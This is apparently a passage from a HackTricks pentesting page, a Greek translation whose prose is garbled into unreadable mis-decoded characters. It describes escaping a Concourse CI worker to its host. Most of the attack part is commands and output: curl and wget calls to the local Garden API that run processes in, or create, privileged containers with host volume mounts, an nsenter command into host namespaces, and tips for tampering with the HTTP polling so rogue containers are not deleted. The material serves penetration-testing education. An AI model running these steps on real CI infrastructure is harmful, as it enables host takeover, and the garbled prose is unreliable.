Î©ÏƒÏ„ÏŒÏƒÎ¿, Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ ÏŒÏ€Ï‰Ï‚ Ï„Î¿ **mounting** Ï„Î·Ï‚ ÏƒÏ…ÏƒÎºÎµÏ…Î®Ï‚ /dev Ï„Î¿Ï… ÎºÏŒÎ¼Î²Î¿Ï… Î® Ï„Î¿Ï… release\_agent **Î´ÎµÎ½ Î¸Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎ¿Ï…Î½** (ÎºÎ±Î¸ÏÏ‚ Î· Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ® ÏƒÏ…ÏƒÎºÎµÏ…Î® Î¼Îµ Ï„Î¿ filesystem Ï„Î¿Ï… ÎºÏŒÎ¼Î²Î¿Ï… Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼Î·, Î¼ÏŒÎ½Î¿ Î¼Î¯Î± ÎµÎ¹ÎºÎ¿Î½Î¹ÎºÎ®). Î”ÎµÎ½ Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± Î­Ï‡Î¿Ï…Î¼Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯ÎµÏ‚ Ï„Î¿Ï… ÎºÏŒÎ¼Î²Î¿Ï…, Î¿Ï€ÏŒÏ„Îµ Î· Î´Î¹Î±Ï†Ï…Î³Î® Î±Ï€ÏŒ Ï„Î¿Î½ ÎºÏŒÎ¼Î²Î¿ Ï‡Ï‰ÏÎ¯Ï‚ exploits Ï€Ï…ÏÎ®Î½Î± Î³Î¯Î½ÎµÏ„Î±Î¹ Ï€ÎµÏÎ¯Ï€Î»Î¿ÎºÎ·.

{% hint style="info" %}
Î£Ï„Î·Î½ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· ÎµÎ½ÏŒÏ„Î·Ï„Î± ÎµÎ¯Î´Î±Î¼Îµ Ï€ÏÏ‚ Î½Î± Î´Î¹Î±Ï†ÏÎ³Î¿Ï…Î¼Îµ Î±Ï€ÏŒ Î­Î½Î± Ï€ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡Î¿ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ, Î¿Ï€ÏŒÏ„Îµ Î±Î½ Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± **ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¿Ï…Î¼Îµ** ÎµÎ½Ï„Î¿Î»Î­Ï‚ ÏƒÎµ Î­Î½Î± **Ï€ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡Î¿ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ** Ï€Î¿Ï… Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®Î¸Î·ÎºÎµ Î±Ï€ÏŒ Ï„Î¿Î½ **Ï„ÏÎ­Ï‡Î¿Î½Ï„Î±** **ÎµÏÎ³Î¬Ï„Î·**, Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Î¼Îµ Î½Î± **Î´Î¹Î±Ï†ÏÎ³Î¿Ï…Î¼Îµ ÏƒÏ„Î¿Î½ ÎºÏŒÎ¼Î²Î¿**.
{% endhint %}

Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Ï€Î±Î¯Î¶Î¿Î½Ï„Î±Ï‚ Î¼Îµ Ï„Î¿ concourse Ï€Î±ÏÎ±Ï„Î®ÏÎ·ÏƒÎ± ÏŒÏ„Î¹ ÏŒÏ„Î±Î½ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Î±Î¹ Î­Î½Î± Î½Î­Î¿ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ ÎºÎ¬Ï„Î¹, Î¿Î¹ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯ÎµÏ‚ Ï„Î¿Ï… ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ ÎµÎ¯Î½Î±Î¹ Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼ÎµÏ‚ Î±Ï€ÏŒ Ï„Î¿ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ Ï„Î¿Ï… ÎµÏÎ³Î¬Ï„Î·, Î¿Ï€ÏŒÏ„Îµ ÎµÎ¯Î½Î±Î¹ ÏƒÎ±Î½ Î­Î½Î± ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯ Î­Î½Î± Î½Î­Î¿ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ Î¼Î­ÏƒÎ± ÏƒÎµ Î±Ï…Ï„ÏŒ.

**Î•Î¯ÏƒÎ¿Î´Î¿Ï‚ ÏƒÎµ Î­Î½Î± ÎµÎºÏ„ÎµÎ»Î¿ÏÎ¼ÎµÎ½Î¿ Ï€ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡Î¿ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ**
```bash
# Get current container
curl 127.0.0.1:7777/containers
{"Handles":["ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

# Get container info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/properties

# Execute a new process inside a container
## In this case "sleep 20000" will be executed in the container with handler ac793559-7f53-4efc-6591-0171a0391e53
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'

# OR instead of doing all of that, you could just get into the ns of the process of the privileged container
nsenter --target 76011 --mount --uts --ipc --net --pid -- sh
```
**Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± ÎµÎ½ÏŒÏ‚ Î½Î­Î¿Ï… Ï€ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡Î¿Ï… ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ**

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Ï€Î¿Î»Ï ÎµÏÎºÎ¿Î»Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± Î½Î­Î¿ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ (Î±Ï€Î»ÏÏ‚ ÎµÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ Î­Î½Î± Ï„Ï…Ï‡Î±Î¯Î¿ UID) ÎºÎ±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ ÎºÎ¬Ï„Î¹ ÏƒÎµ Î±Ï…Ï„ÏŒ:
```bash
curl -X POST http://127.0.0.1:7777/containers \
-H 'Content-Type: application/json' \
-d '{"handle":"123ae8fc-47ed-4eab-6b2e-123458880690","rootfs":"raw:///concourse-work-dir/volumes/live/ec172ffd-31b8-419c-4ab6-89504de17196/volume","image":{},"bind_mounts":[{"src_path":"/concourse-work-dir/volumes/live/9f367605-c9f0-405b-7756-9c113eba11f1/volume","dst_path":"/scratch","mode":1}],"properties":{"user":""},"env":["BUILD_ID=28","BUILD_NAME=24","BUILD_TEAM_ID=1","BUILD_TEAM_NAME=main","ATC_EXTERNAL_URL=http://127.0.0.1:8080"],"limits":{"bandwidth_limits":{},"cpu_limits":{},"disk_limits":{},"memory_limits":{},"pid_limits":{}}}'

# Wget will be stucked there as long as the process is being executed
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
```
Î©ÏƒÏ„ÏŒÏƒÎ¿, Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ Î¹ÏƒÏ„Î¿Ï ÎµÎ»Î­Î³Ï‡ÎµÎ¹ ÎºÎ¬Î¸Îµ Î»Î¯Î³Î± Î´ÎµÏ…Ï„ÎµÏÏŒÎ»ÎµÏ€Ï„Î± Ï„Î± ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹, ÎºÎ±Î¹ Î±Î½ Î±Î½Î±ÎºÎ±Î»Ï…Ï†Î¸ÎµÎ¯ ÎºÎ¬Ï€Î¿Î¹Î¿ Î±Ï€ÏÎ¿ÏƒÎ´ÏŒÎºÎ·Ï„Î¿, Î¸Î± Î´Î¹Î±Î³ÏÎ±Ï†ÎµÎ¯. ÎšÎ±Î¸ÏÏ‚ Î· ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î¼Î­ÏƒÏ‰ HTTP, Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± Ï€Î±ÏÎ±Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î± Î³Î¹Î± Î½Î± Î±Ï€Î¿Ï†ÏÎ³ÎµÏ„Îµ Ï„Î· Î´Î¹Î±Î³ÏÎ±Ï†Î® Î±Ï€ÏÎ¿ÏƒÎ´ÏŒÎºÎ·Ï„Ï‰Î½ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ:
```
GET /containers HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
.

T 127.0.0.1:7777 -> 127.0.0.1:59722 [AP] #157
HTTP/1.1 200 OK.
Content-Type: application/json.
Date: Thu, 17 Mar 2022 22:42:55 GMT.
Content-Length: 131.
.
{"Handles":["123ae8fc-47ed-4eab-6b2e-123458880690","ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

T 127.0.0.1:59722 -> 127.0.0.1:7777 [AP] #159
DELETE /containers/123ae8fc-47ed-4eab-6b2e-123458880690 HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
```
## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* https://concourse-ci.org/vars.html

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
